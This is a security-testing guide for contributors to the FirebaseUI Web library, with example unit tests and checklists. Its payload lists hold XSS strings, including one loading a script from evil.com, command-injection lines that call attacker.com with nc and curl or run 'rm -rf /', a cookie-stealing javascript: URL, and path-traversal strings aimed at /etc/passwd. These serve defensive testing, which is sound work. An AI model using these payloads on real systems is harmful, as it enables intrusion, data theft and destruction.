# Security Testing Guide for FirebaseUI Web

## Overview

This document provides comprehensive guidance on security testing for the FirebaseUI Web library. All contributors should follow these guidelines when adding or modifying code that handles user input, authentication flows, or displays content.

## Security Test Categories

### 1. Cross-Site Scripting (XSS) Prevention

#### What to Test

All user-facing inputs and display elements must be tested for XSS vulnerabilities:

- Email addresses
- Display names
- Phone numbers
- Custom text messages
- URL parameters
- OAuth redirect URLs
- Error messages

#### Test Vectors

Use these common XSS payloads in your tests:

```javascript
var xssPayloads = [
  '<script>alert("xss")</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<svg/onload=alert(1)>',
  '<iframe src=javascript:alert(1)>',
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<select onfocus=alert(1) autofocus>',
  '<textarea onfocus=alert(1) autofocus>',
  '<keygen onfocus=alert(1) autofocus>',
  '<video><source onerror="alert(1)">',
  '<audio src=x onerror=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>',
  '\'-alert(1)-\'',
  '\";alert(1);//',
  '--><script>alert(1)</script>',
  '<!--<script>alert(1)</script>-->',
  '<script src=//evil.com/xss.js></script>'
];
```

#### Example Test

```javascript
function testEmailInput_xssPrevention() {
  var maliciousInputs = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)'
  ];

  maliciousInputs.forEach(function(input) {
    goog.dom.forms.setValue(component.getEmailElement(), input);

    // Verify input is rejected or sanitized
    var result = component.checkAndGetEmail();

    // Should be treated as invalid
    assertNull(result);

    // Or if accepted, verify it's properly escaped when displayed
    if (result !== null) {
      var displayedValue = goog.dom.getTextContent(someDisplayElement);
      // Verify no script execution
      assertFalse(displayedValue.indexOf('<script>') !== -1);
    }
  });
}
```

### 2. URL Sanitization

#### What to Test

All URLs must be sanitized before use, especially:

- Redirect URLs (signInSuccessUrl, continueUrl)
- OAuth callback URLs
- External links (ToS, Privacy Policy)
- IdP authorization URLs

#### Test Vectors

```javascript
var maliciousUrls = [
  'javascript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  'vbscript:alert(1)',
  'file:///etc/passwd',
  '//evil.com/steal-credentials',
  'https://evil.com@legitimate.com',
  'http://legitimate.com.evil.com',
  '\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74:alert(1)',
  'jAvAsCrIpT:alert(1)',
  ' javascript:alert(1)',
  'javascript\n:alert(1)',
  'java\x00script:alert(1)'
];
```

#### Example Test

```javascript
function testUrlSanitization_javascriptProtocol() {
  var dangerousUrl = 'javascript:void(document.cookie="stolen="+document.cookie)';

  // Attempt to set dangerous URL
  config.update('signInSuccessUrl', dangerousUrl);

  // Verify URL is sanitized
  var sanitizedUrl = config.getSignInSuccessUrl();

  // Should not contain javascript: protocol
  assertFalse(sanitizedUrl.toLowerCase().indexOf('javascript:') !== -1);

  // Should be safe default or rejected
  assertTrue(sanitizedUrl === 'about:invalid' || sanitizedUrl === null);
}
```

### 3. SQL Injection (Limited Applicability)

While FirebaseUI Web doesn't directly interact with SQL databases, test any code that constructs queries or filters:

```javascript
var sqlInjectionPayloads = [
  "' OR '1'='1",
  "1' OR '1' = '1",
  "'; DROP TABLE users--",
  "admin'--",
  "1' UNION SELECT NULL--"
];
```

### 4. Command Injection

Test any code that might execute system commands (rare in client-side code):

```javascript
var commandInjectionPayloads = [
  "; cat /etc/passwd",
  "| nc attacker.com 1234",
  "`whoami`",
  "$(curl evil.com)",
  "; rm -rf /",
  "& ping -c 10 evil.com &"
];
```

### 5. Path Traversal

Test file path handling (if applicable):

```javascript
var pathTraversalPayloads = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
];
```

### 6. HTML Injection

Test prevention of HTML injection separate from XSS:

```javascript
var htmlInjectionPayloads = [
  "<h1>Fake Header</h1>",
  "<style>body{display:none}</style>",
  "<base href='http://evil.com'>",
  "<link rel='stylesheet' href='http://evil.com/evil.css'>",
  "<meta http-equiv='refresh' content='0;url=http://evil.com'>"
];
```

### 7. Open Redirect

Test that redirect URLs cannot be manipulated to redirect to malicious sites:

```javascript
function testOpenRedirect_prevention() {
  var redirectTests = [
    {url: 'http://evil.com', shouldBlock: true},
    {url: '//evil.com', shouldBlock: true},
    {url: '/legitimate/path', shouldBlock: false},
    {url: 'https://legitimate.com/path', shouldBlock: false},
    {url: 'http://evil.com@legitimate.com', shouldBlock: true},
    {url: '/\\evil.com', shouldBlock: true}
  ];

  redirectTests.forEach(function(test) {
    // Test redirect validation
    var isAllowed = firebaseui.auth.util.isValidUrl(test.url);

    if (test.shouldBlock) {
      assertFalse('URL should be blocked: ' + test.url, isAllowed);
    } else {
      assertTrue('URL should be allowed: ' + test.url, isAllowed);
    }
  });
}
```

### 8. CSRF Protection

Verify CSRF tokens and state parameters are properly validated:

```javascript
function testOAuthFlow_csrfProtection() {
  // Verify OAuth state parameter is generated
  var state = authHandler.generateOAuthState();
  assertNotNull(state);
  assertTrue(state.length > 16); // Sufficient entropy

  // Verify state is validated on callback
  var validState = authHandler.validateOAuthState(state);
  assertTrue(validState);

  // Verify invalid state is rejected
  var invalidState = authHandler.validateOAuthState('malicious-state');
  assertFalse(invalidState);
}
```

### 9. Password Security

Test password handling:

```javascript
function testPassword_noClientSideStorage() {
  var password = 'test-password-123';

  // Set password
  goog.dom.forms.setValue(component.getPasswordElement(), password);

  // Verify password is not stored in localStorage
  assertNull(localStorage.getItem('password'));
  assertNull(localStorage.getItem('firebaseui_password'));

  // Verify password is not in sessionStorage
  assertNull(sessionStorage.getItem('password'));

  // Verify password is cleared after use
  component.clearPassword();
  assertEquals('', goog.dom.forms.getValue(component.getPasswordElement()));
}

function testPassword_noTrimming() {
  // Passwords should NOT be trimmed - whitespace is valid
  var passwordWithSpaces = '  password  ';
  goog.dom.forms.setValue(component.getPasswordElement(), passwordWithSpaces);

  assertEquals(passwordWithSpaces, component.checkAndGetPassword());
}

function testPassword_typeAttribute() {
  // Verify password input has type="password"
  var passwordElement = component.getPasswordElement();
  assertEquals('password', passwordElement.type);
}
```

### 10. Session Security

Test session handling:

```javascript
function testSession_timeout() {
  // Verify session expires after reasonable time
  // Verify idle timeout is enforced
  // Verify absolute timeout is enforced
}

function testSession_tokenRefresh() {
  // Verify tokens are refreshed before expiry
  // Verify expired tokens are rejected
}
```

## Security Testing Best Practices

### 1. Input Validation

✅ **DO:**
- Whitelist valid characters
- Validate length limits
- Validate format (email, phone, etc.)
- Sanitize before display
- Use type-safe operations

❌ **DON'T:**
- Trust user input
- Use blacklists (easily bypassed)
- Concatenate strings for HTML
- Use eval() or similar
- Store sensitive data in localStorage

### 2. Output Encoding

✅ **DO:**
- Use proper encoding for context (HTML, URL, JS)
- Use framework-provided sanitization
- Use Content Security Policy
- Escape special characters

❌ **DON'T:**
- Insert user input directly into HTML
- Build HTML strings manually
- Trust data from external sources

### 3. Authentication Flow

✅ **DO:**
- Validate OAuth state parameters
- Use PKCE for OAuth flows
- Implement rate limiting
- Log authentication attempts
- Clear sensitive data after use

❌ **DON'T:**
- Store credentials in client-side storage
- Trust URL parameters without validation
- Skip CSRF protection
- Reuse nonces or state values

### 4. Error Handling

✅ **DO:**
- Show generic error messages to users
- Log detailed errors server-side
- Handle all error cases
- Fail securely (deny by default)

❌ **DON'T:**
- Expose stack traces to users
- Reveal system information in errors
- Assume operations succeed
- Fail open (allow by default)

## Test File Template

```javascript
/*
 * Copyright 2025 Google Inc. All Rights Reserved.
 * Licensed under the Apache License, Version 2.0
 */

/**
 * @fileoverview Security tests for [component name]
 */

goog.provide('firebaseui.auth.security.[componentName]Test');
goog.setTestOnly('firebaseui.auth.security.[componentName]Test');

goog.require('[component under test]');
goog.require('goog.testing.jsunit');


function testXssPrevention() {
  var xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)'
  ];

  xssPayloads.forEach(function(payload) {
    // Test that payload is rejected or sanitized
  });
}


function testUrlSanitization() {
  var maliciousUrls = [
    'javascript:void(0)',
    'data:text/html,<script>alert(1)</script>'
  ];

  maliciousUrls.forEach(function(url) {
    // Test that URL is sanitized
  });
}


function testInputValidation() {
  // Test boundary conditions
  // Test invalid formats
  // Test length limits
}


function testOutputEncoding() {
  // Test that output is properly encoded
  // Test that HTML entities are escaped
}
```

## Automated Security Testing

### Running Security Tests

```bash
# Run all tests including security tests
npm test

# Run specific security test file
npm test -- --grep "security"

# Run XSS prevention tests
npm test -- --grep "xss"
```

### Continuous Integration

Security tests should run on every commit and pull request:

```yaml
# .github/workflows/security-tests.yml
name: Security Tests
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - run: npm install
      - run: npm test
```

## Security Review Checklist

Before submitting code, verify:

- [ ] All user inputs are validated
- [ ] All outputs are properly encoded
- [ ] URLs are sanitized
- [ ] No secrets in client-side code
- [ ] CSRF protection is implemented
- [ ] OAuth flows use state parameters
- [ ] Passwords are handled securely
- [ ] Error messages don't leak information
- [ ] Rate limiting is considered
- [ ] Security tests are included
- [ ] No eval() or innerHTML usage
- [ ] Content Security Policy compatible
- [ ] Third-party dependencies are audited

## Reporting Security Issues

**DO NOT** open public GitHub issues for security vulnerabilities.

Instead, report security issues to: https://firebase.google.com/support/troubleshooter/report/bugs

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OAuth 2.0 Security Best Practices](https://tools.ietf.org/html/draft-ietf-oauth-security-topics)
- [Firebase Security Rules](https://firebase.google.com/docs/rules)

## Conclusion

Security testing is critical for authentication libraries. By following these guidelines and including comprehensive security tests, we can help protect users from common web vulnerabilities.

**Remember: Security is not a feature, it's a requirement.**
